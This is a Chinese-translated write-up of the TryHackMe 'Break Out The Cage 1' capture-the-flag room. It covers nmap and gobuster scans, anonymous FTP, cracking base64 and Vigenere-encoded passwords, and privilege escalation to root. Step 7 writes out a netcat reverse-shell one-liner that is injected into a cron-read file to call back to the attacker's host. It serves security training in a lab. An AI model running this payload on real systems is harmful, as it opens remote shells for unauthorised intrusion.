<html>
<head>
<title>TryHackMe: Break Out The Cage 1 Write-up</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe:打破牢笼1-报道</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-break-out-the-cage-1-write-up-3b41acde0475?source=collection_archive---------3-----------------------#2020-11-09">https://infosecwriteups.com/tryhackme-break-out-the-cage-1-write-up-3b41acde0475?source=collection_archive---------3-----------------------#2020-11-09</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi jq"><img src="../Images/0b7ccc87784234a814a9cd3826bb467c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*-VqlvgTb4jJlCgCf.jpeg"/></div></div><figcaption class="kb kc gj gh gi kd ke bd b be z dk translated">简单级CTF挑战</figcaption></figure><p id="1275" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">无需等待；连接到您的OpenVPN网络并加入<a class="ae ld" href="https://tryhackme.com/room/breakoutthecage1" rel="noopener ugc nofollow" target="_blank">房间</a>。</p><h2 id="7f21" class="le lf it bd lg lh li dn lj lk ll dp lm kq ln lo lp ku lq lr ls ky lt lu lv lw bi translated">任务1调查！</h2><ol class=""><li id="8e8d" class="lx ly it kh b ki lz km ma kq mb ku mc ky md lc me mf mg mh bi translated">部署机器后，您将在一分钟内获得您的机器IP。让我们从通过Nmap扫描机器开始。</li></ol><pre class="mi mj mk ml gt mm mn mo mp aw mq bi"><span id="02d8" class="le lf it mn b gy mr ms l mt mu">nmap -sV -sC -A &lt;machine_ip&gt;</span></pre><figure class="mi mj mk ml gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mv"><img src="../Images/7f46c1db71a773612156c714e169626a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3-9R27sKYidiIEDlo8qzNA.png"/></div></div><figcaption class="kb kc gj gh gi kd ke bd b be z dk translated">Nmap扫描结果</figcaption></figure><p id="e1b1" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">2.让我们通过Gobuster工具搜索HTTP中隐藏的扩展。</p><pre class="mi mj mk ml gt mm mn mo mp aw mq bi"><span id="754d" class="le lf it mn b gy mr ms l mt mu">gobuster dir -u http://&lt;machine_ip&gt; -w &lt;wordlist&gt;</span></pre><figure class="mi mj mk ml gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mw"><img src="../Images/a707453039b1a2c9f3d6b07db378d8ca.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1-yYQdsVmVO5Gjp7v3-vTQ.png"/></div></div><figcaption class="kb kc gj gh gi kd ke bd b be z dk translated">Gobuster扫描结果</figcaption></figure><p id="6e45" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">3.因为在HTTP服务器中什么也找不到，所以让我们打开FTP服务器并以匿名身份登录。</p><figure class="mi mj mk ml gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mx"><img src="../Images/daf742d3859c551e3066c3a8060a3703.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EMztcUqbog4GXgM8bu0rcQ.png"/></div></div><figcaption class="kb kc gj gh gi kd ke bd b be z dk translated">ftp服务器</figcaption></figure><p id="0013" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">4.我们可以看到一个名为“dad_tasks”的文件，其中有一个看起来经过编码的字符串。经过多次不同的尝试，我能够使用<a class="ae ld" href="https://gchq.github.io/CyberChef/" rel="noopener ugc nofollow" target="_blank">赛博咖啡馆</a>解码字符串。首先是base64，然后是Vigenere密码。最后，我们会得到韦斯顿的密码。</p><figure class="mi mj mk ml gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi my"><img src="../Images/52c1b26053a3228c73b47c100a1cf887.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9neBHhgL8qdyqGdRJyQezQ.png"/></div></div><figcaption class="kb kc gj gh gi kd ke bd b be z dk translated">韦斯顿的密码</figcaption></figure><p id="a408" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">5.我们成功地以韦斯顿的名义拿到了外壳。</p><figure class="mi mj mk ml gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mz"><img src="../Images/9b096b480e5fce4479f02b693bc86ee6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NtYp8w-gtNLUKZDb_TEDJQ.png"/></div></div></figure><figure class="mi mj mk ml gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi na"><img src="../Images/6d91f47f8f0b7b7c1bba33bb52cc50e5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QffwyxjqxsduFAmrBY9iOw.png"/></div></div></figure><p id="21e5" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">6./opt目录中有一个可疑的点文件。让我们检查一下</p><figure class="mi mj mk ml gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nb"><img src="../Images/c4e5d3db734827e94ef5245b5b0d6a2f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8X-MNfOl4vra5q5hTxEL0g.png"/></div></div></figure><p id="5f6b" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">7.在特定的时间间隔，我们从凯奇那里得到一些信息。这些引用存储在。报价文件。我们可以删除所有这些引号，并添加一个反向shell脚本。</p><pre class="mi mj mk ml gt mm mn mo mp aw mq bi"><span id="1066" class="le lf it mn b gy mr ms l mt mu">echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;system_ip&gt; 1234 &gt;/tmp/f' &gt; .quotes</span></pre><figure class="mi mj mk ml gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nc"><img src="../Images/30ff97c0fd99719c204fc9f9f52e8bfc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LsMGmXlgEFOQto_46vvuCg.png"/></div></div></figure><p id="f482" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">8.同时，我们必须通过Netcat在另一个终端上监听。</p><pre class="mi mj mk ml gt mm mn mo mp aw mq bi"><span id="276e" class="le lf it mn b gy mr ms l mt mu">nc -lvp 1234</span></pre><p id="3933" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">成功拿到了反向壳，用户是凯奇。</p><figure class="mi mj mk ml gt ju gh gi paragraph-image"><div class="gh gi nd"><img src="../Images/26399492fe62672cd3e301c6869f328a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1230/format:webp/1*_ipSqjq3UjLo1gZ9pfZrUQ.png"/></div></figure><p id="f2b9" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">9.“Super_Duper_Checklist”包含用户标志。</p><figure class="mi mj mk ml gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ne"><img src="../Images/e839de9f7464f3907f748188e9f5115e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MQtDT26ryZVNLES5-6EGYQ.png"/></div></div><figcaption class="kb kc gj gh gi kd ke bd b be z dk translated">用户标志</figcaption></figure><p id="ee5d" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">10.在“电子邮件备份”文件夹中，有三封电子邮件。第三封邮件给了我们一张看起来加密了的纸条。</p><figure class="mi mj mk ml gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nf"><img src="../Images/964fc96ff0e8c04e09d49f6980f46bc4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*T7A0DXOHWArLJCJYrWtYiQ.png"/></div></div></figure><p id="4050" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">11.加密的信息可以通过Vignenere Decode在CyberChef中进行解码。关键是“面子”,因为在那封邮件中，它被强调了。破解后，我们会得到root的密码。</p><figure class="mi mj mk ml gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ng"><img src="../Images/07f2c88b5865874350fb2a03609e74e6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oSvIThYzHgeBuv9QFo_tPg.png"/></div></div></figure><p id="f02a" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">12.将用户更改为root。</p><pre class="mi mj mk ml gt mm mn mo mp aw mq bi"><span id="d5eb" class="le lf it mn b gy mr ms l mt mu">su root</span></pre><figure class="mi mj mk ml gt ju gh gi paragraph-image"><div class="gh gi nh"><img src="../Images/efcbb471a5150e1371d43ffe872b0a63.png" data-original-src="https://miro.medium.com/v2/resize:fit:892/format:webp/1*L4L8_BHtDyepzLWJEsifKg.png"/></div><figcaption class="kb kc gj gh gi kd ke bd b be z dk translated">根用户</figcaption></figure><p id="58ab" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">13.根目录中包含两个电子邮件备份。第二封电子邮件包含根标志。</p><figure class="mi mj mk ml gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ni"><img src="../Images/97cba4869d294c1161e6f86b51504f5d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7sAgBdbhF72JfsWMVnjUjA.png"/></div></div><figcaption class="kb kc gj gh gi kd ke bd b be z dk translated">根标志</figcaption></figure><p id="e47f" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">嘣！！！我们已经完成了房间。</p></div><div class="ab cl nj nk hx nl" role="separator"><span class="nm bw bk nn no np"/><span class="nm bw bk nn no np"/><span class="nm bw bk nn no"/></div><div class="im in io ip iq"><p id="476c" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">做这个挑战很有趣。希望大家学到新东西:)。</p><p id="b2b2" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">通过<a class="ae ld" href="https://www.linkedin.com/in/vishnuram-r/" rel="noopener ugc nofollow" target="_blank"> Linkedin </a>和<a class="ae ld" href="https://vishnuram1999.github.io/" rel="noopener ugc nofollow" target="_blank">我的网站</a>和我联系。</p></div></div>    
</body>
</html>